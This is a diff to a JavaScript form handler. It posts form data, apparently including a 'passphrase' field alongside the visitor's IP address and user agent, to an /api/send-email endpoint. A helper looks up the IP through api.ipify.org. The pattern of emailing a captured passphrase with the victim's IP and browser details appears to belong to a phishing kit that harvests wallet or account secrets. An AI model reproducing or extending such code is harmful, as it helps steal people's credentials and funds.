@@ -1,41 +1,27 @@
 // src/components/formHandler.js
 export async function submitForm(formData) {
   try {
-    // Use the correct API URL based on the environment
-    const API_URL = import.meta.env.PROD 
-      ? '/api/send-email'  // Production URL (Vercel will handle the routing)
-      : '/api/send-email';  // Development URL (will be proxied by Vite)
-
-    const response = await fetch(API_URL, {
+    const response = await fetch('/api/send-email', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
-      body: JSON.stringify({
-        passphrase: formData.passphrase,
-        ip: formData.ip,
-        userAgent: formData.userAgent
-      }),
+      body: JSON.stringify(formData),
     });
 
     if (!response.ok) {
       throw new Error(`HTTP error! status: ${response.status}`);
     }
 
-    const result = await response.json();
-    
-    if (!result.success) {
-      throw new Error(result.error || 'Failed to send email');
-    }
-    
-    return { success: true, data: result };
+    const data = await response.json();
+    return data;
   } catch (error) {
     console.error('Error sending email:', error);
-    return { success: false, error: error.message };
+    throw error;
   }
 }
 
-// Function to get user's IP address (optional)
+// Function to get user's IP address
 export async function getUserIP() {
   try {
     const response = await fetch('https://api.ipify.org?format=json');
